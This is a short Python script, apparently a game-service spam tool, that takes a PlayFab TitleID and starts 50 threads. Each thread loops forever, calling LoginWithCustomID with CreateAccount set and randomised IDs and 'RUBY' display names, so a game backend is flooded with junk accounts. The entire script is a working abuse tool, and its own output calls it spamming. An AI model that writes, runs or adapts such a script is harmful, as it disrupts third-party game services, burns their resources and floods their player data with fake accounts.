import threading
import string
import random
from colorama import Fore
from playfab import PlayFabClientAPI, PlayFabSettings
#Made by klox#0001
PlayFabSettings.TitleId = input('TitleID: ')
name = input('CustomID Name: ')
print('Spamming ' + PlayFabSettings.TitleId + ' With Name ' + name)


def callback(success, failure):
  if success:

    print('<Debug> User Created, TitleId: ' +
          PlayFabSettings.TitleId + ', Name: ' + name)
  if failure:
    print('<Debug> Failure Within Spamming. Not Avalible, Rate Limited, or Disabled Api Calls')


def do_random_gen():
  while True:
    bomb = ''.join(
      random.choices(string.ascii_uppercase + string.hexdigits, k=5))
    request = {
      "CustomId":
      name + bomb,
      "CreateAccount":
      True,
      "DisplayName":
      "RUBY" +
      ''.join(random.choices(string.ascii_uppercase + string.hexdigits, k=5)),
    }
    PlayFabClientAPI.LoginWithCustomID(request, callback)


threads = []

for i in range(50):
  t = threading.Thread(target=do_random_gen)
  t.daemon = True
  threads.append(t)

for i in range(50):
  threads[i].start()

for i in range(50):
  threads[i].join()